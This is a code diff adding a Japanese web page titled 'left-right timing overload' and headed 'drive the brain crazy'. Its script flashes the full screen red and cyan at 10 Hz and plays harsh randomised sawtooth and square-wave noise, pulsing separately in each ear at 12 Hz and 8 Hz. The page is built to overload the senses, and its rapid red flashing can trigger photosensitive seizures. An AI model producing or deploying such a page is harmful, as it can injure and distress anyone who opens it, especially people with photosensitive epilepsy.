@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <title>左右別タイミング過負荷</title>
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: background-color 0.1s;
+        }
+        h1 {
+            color: #FFFFFF;
+            font-size: 50px;
+            text-shadow: 2px 2px 5px #000000;
+        }
+    </style>
+</head>
+<body>
+    <h1>脳を狂わせろ</h1>
+    <script>
+        // 視覚点滅 (10Hz = 100ms)
+        let isRed = true;
+        function flash() {
+            document.body.style.backgroundColor = isRed ? "#FF0000" : "#00FFFF";
+            isRed = !isRed;
+            setTimeout(flash, 100);
+        }
+        flash();
+
+        // 聴覚過負荷（左右別タイミング）
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+
+        // 左チャンネル (12Hz = 83ms)
+        function playLeftNoise() {
+            const oscLeft = audioCtx.createOscillator();
+            const gainLeft = audioCtx.createGain();
+            const panLeft = audioCtx.createStereoPanner();
+            oscLeft.connect(gainLeft);
+            gainLeft.connect(panLeft);
+            panLeft.connect(audioCtx.destination);
+            panLeft.pan.value = -1; // 左に全振り
+            oscLeft.frequency.value = Math.random() * 1000 + 200; // 200～1200Hz
+            oscLeft.type = "sawtooth";
+            gainLeft.gain.value = 0.2;
+
+            oscLeft.start();
+            setTimeout(() => oscLeft.stop(), 83); // 83msで停止
+            setTimeout(playLeftNoise, 83); // 12Hzで繰り返し
+        }
+        playLeftNoise();
+
+        // 右チャンネル (8Hz = 125ms)
+        function playRightNoise() {
+            const oscRight = audioCtx.createOscillator();
+            const gainRight = audioCtx.createGain();
+            const panRight = audioCtx.createStereoPanner();
+            oscRight.connect(gainRight);
+            gainRight.connect(panRight);
+            panRight.connect(audioCtx.destination);
+            panRight.pan.value = 1; // 右に全振り
+            oscRight.frequency.value = Math.random() * 1000 + 1200; // 1200～2200Hz
+            oscRight.type = "square";
+            gainRight.gain.value = 0.2;
+
+            oscRight.start();
+            setTimeout(() => oscRight.stop(), 125); // 125msで停止
+            setTimeout(playRightNoise, 125); // 8Hzで繰り返し
+        }
+        playRightNoise();
+    </script>
+</body>
+</html>
